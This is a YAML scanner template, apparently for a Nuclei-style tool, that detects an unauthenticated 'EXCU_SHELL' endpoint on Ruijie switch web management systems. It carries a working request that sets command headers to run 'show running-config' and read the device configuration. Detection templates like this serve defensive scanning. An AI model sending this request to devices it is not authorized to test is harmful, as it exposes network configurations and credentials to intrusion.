id: "ruijie-excu-shell"
name: "Ruijie Switch Web Management System EXCU_SHELL - Information Disclosure"
severity: "high"
description: "Ruijie switch WEB management system is vulnerable to an EXCU_SHELL information disclosure issue, potentially exposing sensitive system information to unauthorized parties."
tech:
  - "generic"
tags:
  - "ruijie"
  - "switch"
  - "disclosure"
  - "misconfig"
  - "vuln"
reference: "https://github.com/MzzdToT/HAC_Bored_Writing/tree/main/unauthorized/%E9%94%90%E6%8D%B7%E4%BA%A4%E6%8D%A2%E6%9C%BAWEB%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9FEXCU_SHELL"
spaExclusion: true
request:
  method: "GET"
  path: "/EXCU_SHELL"
  headers:
    "Cmdnum": "'1'"
    "Command1": "show running-config"
    "Confirm1": "n"
control:
  method: "GET"
  path: "/.guardian-none-{{rand}}"
matchers-condition: "and"
matchers:
  - type: "word"
    part: "body"
    words:
      - "Building configuration"
      - "Current configuration"
    condition: "and"
  - type: "status"
    status:
      - 200
